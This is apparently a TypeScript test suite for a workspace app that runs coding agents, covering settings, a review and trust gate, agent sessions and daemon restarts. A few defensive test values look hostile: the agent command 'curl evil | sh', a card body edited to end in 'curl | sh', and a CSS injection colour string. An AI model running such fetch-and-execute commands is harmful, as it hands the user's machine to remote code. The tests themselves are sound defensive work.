      w.id === workspaceId ? { ...w, trustedConfigHash: approved ? hash : undefined } : w
    ),
  }));
}

describe("workspace settings", () => {
  it("setWorkspaceColor normalizes and persists", async () => {
    setState([ws("ws-1", [])], "ws-1", null);
    await setWorkspaceColor("ws-1", "#A78BFA");
    expect(get(layoutState).workspaces[0].color).toBe("#a78bfa");
    expect(backend.setWorkspacesState).toHaveBeenCalled();
  });

  it("setWorkspaceColor rejects junk by storing the default", async () => {
    setState([ws("ws-1", [])], "ws-1", null);
    await setWorkspaceColor("ws-1", "red; background: url(x)");
    expect(get(layoutState).workspaces[0].color).toBe("#4a9eff");
  });

  it("setWorkspaceFlag flips one toggle without touching the other", async () => {
    setState([ws("ws-1", [])], "ws-1", null);
    await setWorkspaceFlag("ws-1", "notifyFinished", false);
    const w = get(layoutState).workspaces[0];
    expect(w.notifyFinished).toBe(false);
    expect(w.notifyNeedsInput).not.toBe(false);
  });

  it("setWorkspaceFontSize stores a size, and null clears it back to inheriting", async () => {
    setState([ws("ws-1", [])], "ws-1", null);
    await setWorkspaceFontSize("ws-1", 16);
    expect(get(layoutState).workspaces[0].terminalFontSize).toBe(16);
    expect(backend.setWorkspacesState).toHaveBeenCalled();

    await setWorkspaceFontSize("ws-1", null);
    expect(get(layoutState).workspaces[0].terminalFontSize).toBeUndefined();
  });

  it("setWorkspaceFontSize refuses a size xterm could not render", async () => {
    // Stored as "no choice" rather than clamped: a workspace that ends up
    // inheriting is recoverable, one pinned to 2000px is a pane with no
    // rows and no way back to the setting.
    setState([ws("ws-1", [])], "ws-1", null);
    await setWorkspaceFontSize("ws-1", 2000);
    expect(get(layoutState).workspaces[0].terminalFontSize).toBeUndefined();
  });

  it("setTerminalFontSizeDefault goes to config.json, never to the daemon", async () => {
    // A display preference must keep working against any daemon, so it
    // takes the Tauri route the theme does.
    vi.mocked(backend.setRootConfigField).mockClear();
    await setTerminalFontSizeDefault(11);
    expect(backend.setTerminalFontSize).toHaveBeenCalledWith(11);
    expect(backend.setRootConfigField).not.toHaveBeenCalled();
    expect(get(terminalFontSizeDefault)).toBe(11);

    await setTerminalFontSizeDefault(null);
    expect(get(terminalFontSizeDefault)).toBeNull();
  });

  it("setWorkspaceCustomResumeArgs stores a flag, trimmed, and null clears it back to inheriting", async () => {
    setState([ws("ws-1", [])], "ws-1", null);
    await setWorkspaceCustomResumeArgs("ws-1", "  --resume  ");
    expect(get(layoutState).workspaces[0].customResumeArgs).toBe("--resume");
    expect(backend.setWorkspacesState).toHaveBeenCalled();

    await setWorkspaceCustomResumeArgs("ws-1", null);
    expect(get(layoutState).workspaces[0].customResumeArgs).toBeUndefined();
  });

  it("setCustomResumeArgsDefault goes to config.json, never to the daemon", async () => {
    await setCustomResumeArgsDefault("--resume");
    expect(backend.setCustomResumeArgs).toHaveBeenCalledWith("--resume");
    expect(get(customResumeArgsDefault)).toBe("--resume");

    await setCustomResumeArgsDefault(null);
    expect(get(customResumeArgsDefault)).toBeNull();
  });

  it("setAutoCommitDefault goes to config.json, never to the daemon", async () => {
    // The whole point of keeping auto commit out of frontmatter is that
    // it needs no daemon at all -- so this setting must not acquire one.
    vi.mocked(backend.setRootConfigField).mockClear();
    await setAutoCommitDefault(true);
    expect(backend.setAutoCommit).toHaveBeenCalledWith(true);
    expect(backend.setRootConfigField).not.toHaveBeenCalled();
    expect(get(autoCommitDefault)).toBe(true);

    await setAutoCommitDefault(null);
    expect(get(autoCommitDefault)).toBeNull();
  });

  it("setWorkspaceAutoCommit stores a choice, and null clears it back to inheriting", async () => {
    setState([ws("ws-1", [])], "ws-1", null);
    await setWorkspaceAutoCommit("ws-1", true);
    expect(get(layoutState).workspaces[0].autoCommit).toBe(true);
    expect(backend.setWorkspacesState).toHaveBeenCalled();

    // False is a CHOICE, not an absence: a workspace that has said "off"
    // must stay off when the app-wide default is turned on.
    await setWorkspaceAutoCommit("ws-1", false);
    expect(get(layoutState).workspaces[0].autoCommit).toBe(false);

    await setWorkspaceAutoCommit("ws-1", null);
    expect(get(layoutState).workspaces[0].autoCommit).toBeUndefined();
  });

  it("the new-card default prefers the active workspace, then the app default, then off", async () => {
    autoCommitDefault.set(null);
    setState([ws("ws-1", [])], "ws-1", null);
    expect(get(newCardAutoCommit)).toBe(false);

    autoCommitDefault.set(true);
    expect(get(newCardAutoCommit)).toBe(true);

    await setWorkspaceAutoCommit("ws-1", false);
    expect(get(newCardAutoCommit)).toBe(false);

    // Switching workspaces re-answers the question: a second workspace
    // that chose nothing must follow the app default, not the first
    // workspace's explicit off.
    setState([{ ...ws("ws-1", []), autoCommit: false }, ws("ws-2", [])], "ws-2", null);
    expect(get(newCardAutoCommit)).toBe(true);
  });

  it("the resolved size prefers the active workspace, then the app default, then gavin's", async () => {
    terminalFontSizeDefault.set(null);
    setState([ws("ws-1", [])], "ws-1", null);
    expect(get(terminalFontSize)).toBe(13);

    terminalFontSizeDefault.set(11);
    expect(get(terminalFontSize)).toBe(11);

    await setWorkspaceFontSize("ws-1", 16);
    expect(get(terminalFontSize)).toBe(16);

    // Switching workspaces re-answers the question -- the store is what
    // every open pane reads, so a second workspace must not inherit the
    // first one's override.
    setState([{ ...ws("ws-1", []), terminalFontSize: 16 }, ws("ws-2", [])], "ws-2", null);
    expect(get(terminalFontSize)).toBe(11);
    terminalFontSizeDefault.set(null);
  });

  it("setAgentField writes config.toml through the daemon, not config.json", async () => {
    setState([{ ...ws("ws-1", []), rootPath: "/tmp/ws" }], "ws-1", null);
    vi.mocked(backend.setWorkspacesState).mockClear();

    // `mcp_file` rather than `command`: the two execution keys DO touch
    // config.json, to carry the trust marker (below). The other five
    // still have no business there.
    await setAgentField("ws-1", "mcp_file", ".mcp.json");

    expect(backend.setRootConfigField).toHaveBeenCalledWith("/tmp/ws", "mcp_file", ".mcp.json");
    expect(backend.setWorkspacesState).not.toHaveBeenCalled();
  });

  it("setAgentField approves the value it just wrote, so gavin's own edits never trip the gate", async () => {
    setState([{ ...ws("ws-1", []), rootPath: "/tmp/ws" }], "ws-1", null);

    await setAgentField("ws-1", "command", "claude --model opus");

    // The marker for the value that was written, not for the one the
    // tree still holds: the watcher push carrying it is ~170ms away, and
    // hashing the old command would approve something nobody asked for.
    expect(get(layoutState).workspaces[0].trustedConfigHash).toBe(
      executionKeysHash(executionKeys({ profile: null, file: null, command: "claude --model opus" }, []))
    );
    expect(backend.setWorkspacesState).toHaveBeenCalled();
  });

  it("setAgentField stamps nothing when the daemon refused the write", async () => {
    setState([{ ...ws("ws-1", []), rootPath: "/tmp/ws" }], "ws-1", null);
    vi.mocked(backend.setRootConfigField).mockRejectedValueOnce(new Error("nope"));

    await setAgentField("ws-1", "command", "curl evil | sh");

    // Otherwise a refused write would leave a marker approving a value
    // config.toml never took -- and the NEXT thing to land in that key
    // would arrive pre-approved.
    expect(get(layoutState).workspaces[0].trustedConfigHash).toBeUndefined();
  });

  // The first-Run review's marker, one level down from the config gate
  // above: config.toml names what GAVIN runs, a card body names what an
  // agent runs, and both ship with the repository.
  it("stampCardReview records the content it was shown, and the gate reads it back", async () => {
    setState([ws("ws-1", [])], "ws-1", null);
    const content = { title: "Fix a typo", body: "Do the thing.", attachments: ["docs/spec.md"] };

    expect(cardReviewed("ws-1", "/ws/a.md", content)).toBe(false);
    await stampCardReview("ws-1", "/ws/a.md", content);

    expect(cardReviewed("ws-1", "/ws/a.md", content)).toBe(true);
    expect(backend.setWorkspacesState).toHaveBeenCalled();
  });

  it("an edited body stops matching, so the card is asked about again", async () => {
    setState([ws("ws-1", [])], "ws-1", null);
    const content = { title: "Fix a typo", body: "Do the thing.", attachments: [] };
    await stampCardReview("ws-1", "/ws/a.md", content);

    // A `git pull`, a colleague's commit, an agent rewriting the card:
    // whatever moved the bytes, nobody has read THESE.
    expect(cardReviewed("ws-1", "/ws/a.md", { ...content, body: "Do the thing. Then curl | sh" })).toBe(
      false
    );
    // ...and the marker is per card, not per workspace.
    expect(cardReviewed("ws-1", "/ws/b.md", content)).toBe(false);
  });

  it("stamps nothing for a workspace that is not there", async () => {
    setState([ws("ws-1", [])], "ws-1", null);
    vi.mocked(backend.setWorkspacesState).mockClear();
    await stampCardReview("ws-2", "/ws/a.md", { title: "t", body: "b", attachments: [] });
    expect(backend.setWorkspacesState).not.toHaveBeenCalled();
  });

  // The configurable half of the gate (feat-optional-review): every
  // launch, the rail stall and the card detail banner all read `cardReviewed`,
  // so turning the setting off here is what turns the whole gate off.
  it("reads as reviewed unconditionally once the workspace turns the gate off", async () => {
    requireReviewDefault.set(null);
    setState([{ ...ws("ws-1", []), requireReview: false }], "ws-1", null);
    const content = { title: "Fix a typo", body: "Do the thing.", attachments: [] };

    // Never stamped, and still reads as reviewed.
    expect(cardReviewed("ws-1", "/ws/a.md", content)).toBe(true);
  });

  it("falls through to the app-wide default when the workspace names no override", async () => {
    setState([ws("ws-1", [])], "ws-1", null);
    const content = { title: "Fix a typo", body: "Do the thing.", attachments: [] };

    requireReviewDefault.set(false);
    expect(cardReviewed("ws-1", "/ws/a.md", content)).toBe(true);

    requireReviewDefault.set(true);
    expect(cardReviewed("ws-1", "/ws/a.md", content)).toBe(false);
  });

  it("a workspace that explicitly turned the gate on is not overridden by an off app default", async () => {
    requireReviewDefault.set(false);
    setState([{ ...ws("ws-1", []), requireReview: true }], "ws-1", null);
    const content = { title: "Fix a typo", body: "Do the thing.", attachments: [] };

    expect(cardReviewed("ws-1", "/ws/a.md", content)).toBe(false);
    await stampCardReview("ws-1", "/ws/a.md", content);
    expect(cardReviewed("ws-1", "/ws/a.md", content)).toBe(true);
  });

  it("setWorkspaceRequireReview stores the choice, and null clears it back to inherit", async () => {
    setState([ws("ws-1", [])], "ws-1", null);

    await setWorkspaceRequireReview("ws-1", false);
    expect(get(layoutState).workspaces[0].requireReview).toBe(false);
    expect(backend.setWorkspacesState).toHaveBeenCalled();

    await setWorkspaceRequireReview("ws-1", null);
    expect(get(layoutState).workspaces[0].requireReview).toBeUndefined();
  });

  it("setRequireReviewDefault persists to config.json and updates the store", async () => {
    await setRequireReviewDefault(false);
    expect(backend.setRequireReview).toHaveBeenCalledWith(false);
    expect(get(requireReviewDefault)).toBe(false);

    await setRequireReviewDefault(null);
    expect(backend.setRequireReview).toHaveBeenCalledWith(null);
    expect(get(requireReviewDefault)).toBeNull();
  });

  it("markRequireReviewAsked records the question was put, once", async () => {
    setState([ws("ws-1", [])], "ws-1", null);
    expect(get(layoutState).workspaces[0].requireReviewAsked).toBeUndefined();

    await markRequireReviewAsked("ws-1");
    expect(get(layoutState).workspaces[0].requireReviewAsked).toBe(true);

    vi.mocked(backend.setWorkspacesState).mockClear();
    await markRequireReviewAsked("ws-1");
    expect(backend.setWorkspacesState).not.toHaveBeenCalled();
  });

  it("setAgentField does nothing without a root", async () => {
    setState([ws("ws-1", [])], "ws-1", null);
    vi.mocked(backend.setRootConfigField).mockClear();
    await setAgentField("ws-1", "command", "x");
    expect(backend.setRootConfigField).not.toHaveBeenCalled();
  });
});

describe("main agent session", () => {
  // Was driven by a workspace.agentCommand field; the command now comes
  // from .gavin-root/config.toml via the gavin tree (D41), so the test
  // seeds the tree instead.
  it("startMainAgent spawns at the root with the configured command and persists", async () => {
    setState([{ ...ws("ws-1", []), rootPath: "/tmp/ws" }], "ws-1", null);
    seedAgentConfig("ws-1", { profile: "claude-code", file: null, command: "claude --model opus" });
    vi.mocked(backend.createSession).mockResolvedValue("agent-1");

    await startMainAgent("ws-1");

    expect(backend.createSession).toHaveBeenCalledWith("/tmp/ws", "claude --model opus", "/tmp/ws");
    expect(get(layoutState).workspaces[0].mainSessionId).toBe("agent-1");
    expect(backend.setWorkspacesState).toHaveBeenCalled();
  });

  it("startMainAgent falls back to claude and refuses without a root or when one runs", async () => {
    setState([{ ...ws("ws-1", []), rootPath: "/tmp/ws" }], "ws-1", null);
    vi.mocked(backend.createSession).mockResolvedValue("agent-1");
    await startMainAgent("ws-1");
    expect(backend.createSession).toHaveBeenCalledWith("/tmp/ws", "claude", "/tmp/ws");

    // Already running: no second spawn.
    await startMainAgent("ws-1");
    expect(backend.createSession).toHaveBeenCalledOnce();

    // No root: nothing at all.
    setState([ws("ws-2", [])], "ws-2", null);
    vi.mocked(backend.createSession).mockClear();
    await startMainAgent("ws-2");
    expect(backend.createSession).not.toHaveBeenCalled();
  });

  it("stopMainAgent kills the session and clears the id", async () => {
    setState([{ ...ws("ws-1", []), rootPath: "/tmp/ws", mainSessionId: "agent-1" }], "ws-1", null);

    await stopMainAgent("ws-1");

    expect(backend.killSession).toHaveBeenCalledWith("agent-1");
    expect(get(layoutState).workspaces[0].mainSessionId).toBeUndefined();
  });

  it("startMainAgentWithPrompt spawns with the composed prompt and records the session", async () => {
    setState([{ ...ws("ws-1", []), rootPath: "/tmp/ws" }], "ws-1", null);
    seedAgentConfig("ws-1", { profile: "claude-code", file: null, command: "claude" });
    vi.mocked(backend.createSession).mockResolvedValue("agent-1");

    await startMainAgentWithPrompt("ws-1", "Use the gavin-write-prd skill.");

    expect(backend.createSession).toHaveBeenCalledWith(
      "/tmp/ws",
      "claude 'Use the gavin-write-prd skill.'",
      "/tmp/ws"
    );

    expect(get(layoutState).workspaces[0].mainSessionId).toBe("agent-1");
  });

  it("startMainAgentWithPrompt refuses when an agent is already running", async () => {
    setState([{ ...ws("ws-1", []), rootPath: "/tmp/ws", mainSessionId: "already" }], "ws-1", null);
    vi.mocked(backend.createSession).mockClear();
    await startMainAgentWithPrompt("ws-1", "anything");
    expect(backend.createSession).not.toHaveBeenCalled();
  });

  it("handleSessionExited clears the owning workspace's main session only", async () => {
    setState(
      [
        { ...ws("ws-1", []), mainSessionId: "agent-1" },
        { ...ws("ws-2", []), mainSessionId: "agent-2" },
      ],
      "ws-1",
      null
    );

    handleSessionExited("agent-1");

    const after = get(layoutState).workspaces;
    expect(after[0].mainSessionId).toBeUndefined();
    expect(after[1].mainSessionId).toBe("agent-2");
  });
});

describe("restartDaemonInPlace", () => {
  it("reloads workspaces from the daemon and leaves the app up", async () => {
    setState([ws("ws-1", [])], "ws-1", null);
    layoutState.update((s) => ({ ...s, status: "ready" }));
    vi.mocked(backend.restartDaemon).mockResolvedValue(undefined);
    vi.mocked(backend.getWorkspacesState).mockResolvedValue({
      workspaces: [ws("ws-1", [])],
      activeWorkspaceId: "ws-1",
    });

    await restartDaemonInPlace("grant");

    expect(backend.restartDaemon).toHaveBeenCalled();
    expect(backend.getWorkspacesState).toHaveBeenCalled();
    // Unlike retryConnect, this never drops the app into "connecting" --
    // the window stays live through the restart.
    expect(get(layoutState).status).toBe("ready");
  });

  it("throws so the caller can show the failure, and leaves the app ready", async () => {
    setState([ws("ws-1", [])], "ws-1", null);
    layoutState.update((s) => ({ ...s, status: "ready" }));
    vi.mocked(backend.restartDaemon).mockRejectedValue(new Error("pkill unavailable"));

    await expect(restartDaemonInPlace("grant")).rejects.toThrow("pkill unavailable");
    expect(get(layoutState).status).toBe("ready");
  });

  // The verdict is what the caller compares against the pre-restart one to
  // tell "restarted onto a newer daemon" from "restarted onto the same
  // stale binary" -- the whole difference between the banner's CTA looking
  // dead and looking honest. Fire-and-forget refreshing would hand the
  // caller nothing to compare.
  it("hands back the verdict the restart landed on", async () => {
    setState([ws("ws-1", [])], "ws-1", null);
    layoutState.update((s) => ({ ...s, status: "ready" }));
    daemonCompat.set({ daemonVersion: 16, appVersion: 17, degraded: true });
    vi.mocked(backend.restartDaemon).mockResolvedValue(undefined);
    vi.mocked(backend.getWorkspacesState).mockResolvedValue({
      workspaces: [ws("ws-1", [])],
      activeWorkspaceId: "ws-1",
    });
    vi.mocked(backend.daemonCompat).mockResolvedValue({
      daemonVersion: 17,
      appVersion: 17,
      degraded: false,
    });

    const after = await restartDaemonInPlace("grant");

    expect(after).toEqual({ daemonVersion: 17, appVersion: 17, degraded: false });
    expect(get(daemonCompat)).toEqual(after);
  });

  // A failed probe must not read as "the daemon changed": the retained
  // verdict is the honest answer, and returning null instead would make
  // the caller report an unknown version rather than the one it still has.
  it("falls back to the retained verdict when the probe fails", async () => {
    setState([ws("ws-1", [])], "ws-1", null);
    layoutState.update((s) => ({ ...s, status: "ready" }));
    const retained = { daemonVersion: 16, appVersion: 17, degraded: true };
    daemonCompat.set(retained);
    vi.mocked(backend.restartDaemon).mockResolvedValue(undefined);
    vi.mocked(backend.getWorkspacesState).mockResolvedValue({
      workspaces: [ws("ws-1", [])],
      activeWorkspaceId: "ws-1",
    });
    vi.mocked(backend.daemonCompat).mockRejectedValue(new Error("ipc hiccup"));

    expect(await restartDaemonInPlace("grant")).toEqual(retained);
  });

  // The regression this guards: DaemonCompatBanner's "Restart daemon"
  // button calls this function (not retryConnect, which unconditionally
  // flips status to "connecting" and, on failure, "error" -- blanking the
  // working app behind an overlay the moment the user acts on the very
  // banner explaining the app still works). A caller catching the thrown
  // error is only a safe pattern if `status` truly never moves on this
  // path; this test is what would fail if that guarantee broke.
  it("does not touch status or the daemonCompat verdict when the restart fails", async () => {
    setState([ws("ws-1", [])], "ws-1", null);
    layoutState.update((s) => ({ ...s, status: "ready" }));
    const previousCompat = { daemonVersion: 9, appVersion: 12, degraded: true };
    daemonCompat.set(previousCompat);
    vi.mocked(backend.restartDaemon).mockRejectedValue(new Error("pkill unavailable"));

    await expect(restartDaemonInPlace("grant")).rejects.toThrow("pkill unavailable");

    expect(get(layoutState).status).toBe("ready");
    // The verdict the banner is still showing must survive a failed
    // restart untouched -- the user is exactly where they were, with an
    // explanation, not looking at a blanked-out or stale-cleared banner.
    expect(get(daemonCompat)).toEqual(previousCompat);
  });
});

// The set of sessions a daemon restart would end -- what DaemonCompatBanner
// sizes its "restarting will end N running agents" warning from. Tested
// directly against a hand-built LayoutState rather than through the store,
// since the point is the derivation itself, not any store plumbing.
describe("runningSessionCount", () => {
  function state(overrides: Partial<LayoutState>): LayoutState {
    return {
      status: "ready",
      errorMessage: "",
      workspaces: [],
      activeWorkspaceId: null,
      focusedSessionId: null,
      cwdBySessionId: {},
      sessionNames: {},
      sessionStatusById: {},
      statusSinceById: {},
      readSessionIds: new Set(),
      gitStatusById: {},
      restoredSessionIds: new Set(),
      interruptedSessionIds: new Set(),
      orphanBySessionId: {},
      failureReasonById: {},
      sessionsSeenWorking: new Set(),
      fileTabsById: {},
      boardTabsById: {},
      cardTabsById: {},
      removedWorkspaces: [],
      ...overrides,
    };
  }

  it("counts every session tab across every page and workspace", () => {
    const s = state({
      workspaces: [
        ws("w1", [page("p1", leaf(["a", "b"])), page("p2", leaf(["c"]))]),
        ws("w2", [page("p3", leaf(["d"]))]),
      ],
    });
    expect(runningSessionCount(s)).toBe(4);
  });

  it("counts a main agent session, which lives outside every page tree", () => {
    const s = state({
      workspaces: [{ ...ws("w1", [page("p1", leaf(["a"]))]), mainSessionId: "main-1" }],
    });
    expect(runningSessionCount(s)).toBe(2);
  });

  it("excludes file and board tabs -- the daemon has never heard of them", () => {
    const s = state({
      workspaces: [ws("w1", [page("p1", leaf(["a", "file-1", "board-1"]))])],
      fileTabsById: { "file-1": { path: "/tmp/x" } },
      boardTabsById: { "board-1": { workspaceId: "w1", contextFolder: "." } },
    });
    expect(runningSessionCount(s)).toBe(1);
  });

  it("dedupes an id that happens to appear on more than one page", () => {
    const s = state({
      workspaces: [ws("w1", [page("p1", leaf(["a"])), page("p2", leaf(["a"]))])],
    });
    expect(runningSessionCount(s)).toBe(1);
  });

  it("is zero with no workspaces", () => {
    expect(runningSessionCount(state({}))).toBe(0);
  });
});
